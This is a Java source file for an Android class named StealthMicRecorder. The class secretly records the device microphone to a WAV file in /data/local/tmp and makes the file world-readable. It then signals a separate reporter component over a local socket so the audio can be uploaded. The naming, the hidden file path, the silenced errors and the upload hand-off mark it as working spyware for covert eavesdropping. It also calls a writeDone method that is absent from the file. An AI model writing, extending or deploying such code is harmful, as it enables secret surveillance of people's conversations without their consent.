package com.stealthaudio;

import android.content.Context;
import android.media.AudioFormat;
import android.media.AudioRecord;
import android.media.MediaRecorder;
import android.util.Log;

import java.io.File;
import java.io.FileOutputStream;
import java.io.FileWriter;
import java.nio.ByteBuffer;
import java.nio.ByteOrder;
import java.util.Date;

public final class StealthMicRecorder {
    private static final String TAG      = "StealthAudio";
    static final         String MIC_FILE = "/data/local/tmp/mic.wav";
    // Note: mic_record.done is no longer written — reporter uses a CV signal via
    // LocalSocketReporter.send("mic_record_file_ready") and a direct WAV stat check.

    private StealthMicRecorder() {}

    private static void logError(String msg, Throwable t) {
        String full = new Date() + " [StealthMicRecorder] " + msg + (t != null ? ": " + t : "");
        Log.e(TAG, full, t);
        try (FileWriter w = new FileWriter(new File("/data/local/tmp/audio_errors.txt"), true)) {
            w.write(full + "\n");
        } catch (Exception ignored) {}
    }


    public static void record(Context context, int durationSec) {
        unlinkQuiet(MIC_FILE);

        if (durationSec <= 0) {
            durationSec = 30;
        } else if (durationSec > 300) {
            durationSec = 300;
        }

        final int sampleRate = 44100;
        final int channels = 1;
        final int channelConfig = AudioFormat.CHANNEL_IN_MONO;
        final int audioFormat = AudioFormat.ENCODING_PCM_16BIT;
        final int bytesPerSample = 2;

        int minBuffer = AudioRecord.getMinBufferSize(sampleRate, channelConfig, audioFormat);
        // Fix: Enforce structured minimum bounds rules explicitly
        if (minBuffer <= 0) {
            minBuffer = 4096;
        }
        int bufferSize = Math.max(minBuffer * 2, sampleRate / 10 * bytesPerSample);

        AudioRecord recorder = null;
        FileOutputStream out = null;
        try {
            recorder = new AudioRecord(
                    MediaRecorder.AudioSource.MIC,
                    sampleRate,
                    channelConfig,
                    audioFormat,
                    bufferSize);

            if (recorder.getState() != AudioRecord.STATE_INITIALIZED) {
                logError("AudioRecord failed to initialize", null);
                return;
            }

            out = new FileOutputStream(MIC_FILE);
            writeWavHeader(out, sampleRate, channels, 0);

            byte[] buffer = new byte[Math.max(minBuffer, 4096)];
            recorder.startRecording();
            long endAt = System.currentTimeMillis() + (durationSec * 1000L);
            int totalBytes = 0;

            while (System.currentTimeMillis() < endAt && !Thread.currentThread().isInterrupted()) {
                int read = recorder.read(buffer, 0, buffer.length);
                if (read > 0) {
                    out.write(buffer, 0, read);
                    totalBytes += read;
                } else if (read == 0) {
                    try {
                        Thread.sleep(10);
                    } catch (InterruptedException e) {
                        Thread.currentThread().interrupt();
                        break;
                    }
                } else if (read == AudioRecord.ERROR_INVALID_OPERATION
                        || read == AudioRecord.ERROR_BAD_VALUE
                        || read == AudioRecord.ERROR_DEAD_OBJECT) {
                    logError("AudioRecord.read error: " + read, null);
                    return;
                }
            }

            try {
                recorder.stop();
            } catch (Exception ignored) {}

            // FIX R3-5: FileOutputStream.getChannel().position(0) moves the FileChannel's
            // internal position, but subsequent FileOutputStream.write() calls bypass
            // the channel and can land at the wrong offset, corrupting the WAV header.
            // Writing through the FileChannel directly (not the stream) is unambiguous.
            try {
                java.nio.channels.FileChannel fc = out.getChannel();
                fc.force(false);          // flush all captured audio frames to the OS
                fc.position(0);           // seek back to the start
                java.nio.ByteBuffer hdrBuf = buildWavHeaderBuffer(sampleRate, channels, totalBytes);
                while (hdrBuf.hasRemaining()) fc.write(hdrBuf);
                fc.force(true);           // fsync — ensures header is durable before upload
            } catch (Exception e) {
                logError("WAV header patch failed", e);
            }

            if (totalBytes <= 0) {
                logError("Recorded 0 bytes of audio", null);
                return;
            }

            // Fix: Drop runtime command calls to shell; run safe native platform checks instead
            setFileWorldReadable(new File(MIC_FILE));
            writeDone("ok:" + totalBytes);
            // Signal reporter immediately via IPC so it can upload without polling for the done file.
            LocalSocketReporter.send("{\"event\":\"mic_record_file_ready\",\"bytes\":" + totalBytes + "}");
            Log.i(TAG, "Mic recording complete: " + totalBytes + " bytes, " + durationSec + "s");
        } catch (Exception e) {
            logError("Mic recording failed", e);
        } finally {
            if (recorder != null) {
                try { recorder.release(); } catch (Exception ignored) {}
            }
            if (out != null) {
                try { out.close(); } catch (Exception ignored) {}
            }
        }
    }

    private static java.nio.ByteBuffer buildWavHeaderBuffer(int sampleRate, int channels, int dataBytes)
            throws java.io.IOException {
        int blockAlign = channels * 2;
        int byteRate = sampleRate * blockAlign;
        int riffSize = 36 + dataBytes;
        ByteBuffer hdr = ByteBuffer.allocate(44).order(ByteOrder.LITTLE_ENDIAN);
        hdr.put("RIFF".getBytes("US-ASCII"));
        hdr.putInt(riffSize);
        hdr.put("WAVE".getBytes("US-ASCII"));
        hdr.put("fmt ".getBytes("US-ASCII"));
        hdr.putInt(16);
        hdr.putShort((short) 1);
        hdr.putShort((short) channels);
        hdr.putInt(sampleRate);
        hdr.putInt(byteRate);
        hdr.putShort((short) blockAlign);
        hdr.putShort((short) 16);
        hdr.put("data".getBytes("US-ASCII"));
        hdr.putInt(dataBytes);
        hdr.flip();
        return hdr;
    }

    private static void writeWavHeader(FileOutputStream out, int sampleRate, int channels, int dataBytes)
            throws java.io.IOException {
        // Delegate to the ByteBuffer builder so both code paths produce identical headers.
        ByteBuffer hdr = buildWavHeaderBuffer(sampleRate, channels, dataBytes);
        out.write(hdr.array(), 0, 44);
    }

    private static void unlinkQuiet(String path) {
        try {
            new File(path).delete();
        } catch (Exception ignored) {}
    }

    private static void setFileWorldReadable(File file) {
        try {
            if (file.exists()) {
                file.setReadable(true, false);
            }
        } catch (Exception ignored) {}
    }
}